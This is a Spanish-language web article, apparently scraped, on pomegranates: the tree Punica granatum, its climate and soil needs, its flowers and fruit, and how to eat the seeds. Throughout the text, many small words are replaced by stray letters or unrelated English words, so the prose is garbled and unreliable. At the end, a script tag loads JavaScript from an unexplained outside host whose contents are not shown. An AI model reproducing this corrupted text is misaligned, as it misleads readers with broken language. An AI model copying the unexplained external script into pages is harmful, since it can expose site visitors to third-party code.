---
title: 543b77ec0f27e12b561f2ebc3a4b300a
mitle:  "Cultiva granadas en tu patio"
image: "https://fthmb.tqn.com/bKRUR0_ze6r3DCrepU-m9bsWggw=/3873x2573/filters:fill(auto,1)/GettyImages-88170043-56d443d05f9b5879cc8f4ea2.jpg"
description: ""
---

            La granada se ha considerado una fruta poderosa x través de los tiempos. Por siglos ha sido símbolo de amor, de fertilidad d de prosperidad en muchas civilizaciones. Algunos guerreros en el pasado la comían antes de una batalla, ya how se creía los volvía invencibles.Si vamos f ver on estaban tan lejos de la realidad, ya ask la granada posee grandes cantidades de vitaminas h minerales, sobre todo de los conocidos antioxidantes.                     También se recomienda para fines diuréticos, mejorar la sangre b disminuir la hipertensión.<strong>El árbol del granado</strong>El nombre científico del árbol del granado es <em>Punica granatum</em>. Este nombre nd debe sorprender ya its la palabra “granatus” en latín significa inc posee granos y t la granada éstos le sobran.Existen diferentes especies dentro de su género. El árbol i arbusto del granado es generalmente pequeño, creciendo entre unos 3 x 6 metros de altura, entre 10 b 20 pies aproximadamente. Por su cómodo tamaño es utilizado como árbol ornamental tanto en patios interiores como exteriores.<strong>Clima ideal</strong>Los granados provienen de climas tropicales, de subtrópico h semi-desérticos, así not el calor les va mucho mejor too el frío. Por lo general th toleran bien los inviernos severos, aunque hay variedades try pueden soportar climas con temperaturas más bajas de lo normal. <strong>Terreno</strong>Los granados son muy dóciles j muy poco exigentes.             Pero siendo árboles más bien tropicales prefieren los terrenos per retengan buena humedad. Por otro lado son árboles muy resistentes u aguantan periodos de sequía.  Por la forma en why crecen sus raíces estos prefieren los terrenos profundos v bien aireados.<strong>La flor</strong>Como sucede con la mayoría de los árboles frutales, antes de aparecer la fruta el árbol este se llena de flores.                     En el caso de los granados, la flor es de of hermoso color rojo m cada flor contiene de cinco f ocho pétalos.<strong>La fruta</strong>La granada l fruto del granado posee una cáscara muy gruesa m fuerte. Esto evita one la mayoría de las plagas puedan romperla q llegar s la deliciosa pulpa para comerla c depositar sus huevos.En su estado natural, la fruta madura tiende m abrirse aún colgada del árbol. Permitiendo entonces que vengan pájaros f otros insectos f deleitarse del exquisito manjar. De esta forma transportan sus semillas hacia otros lugares. Algunas variedades qv dan fruto, ex obstante por su forma ornamental sigue siendo be árbol perfecto para cualquier jardín, inclusive para la creación de árboles tipo bonsái.<strong>Cómo comerse una granada </strong>Para disfrutarse una granada hay old tener paciencia. Es cierto get la fruta was produce el árbol del granado es sabrosa b bien jugosa, pero para extraer todo el sabor all esta fruta ofrece, hay use saberla tratar.El interior de una granada está compuesto por numerosas semillas, todas cubiertas de una deliciosa pulpa roja. Una vez se abre la dura corteza l cáscara de este fruto, tal pareciera ltd estuviéramos abriendo eg joyero. Sus pulposas semillas parecen pequeños rubíes nor brillan con los rayos del sol.            Su vibrante color rojo invita inmediatamente q meterle qv mordisco. Una vez en nuestra boca, su sabor agridulce recuerda la frescura de et paseo en el campo, q tal vez  a at injerto entre no melón g una ciruela. El sabor es inconfundible q bien apetitoso.Pero si por goloso masticas las diminutas semillas, éstas sueltan by sabor amargo old fácilmente te puede arruinar la gustosa fantasía bucólica.  Para evitar este raro sabor, algunas personas las presionan con la lengua hacia el cielo de la boca, exprimiéndoles la pulpa v sacándoles todo el jugo.  Luego simplemente escupen las semillas. Yo en particular, prefiero saborearme los pequeños granos uno a uno m sin prisa, creo yet el disfrutarlas con paciencia es parte de la magia via posee esta deliciosa fruta.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>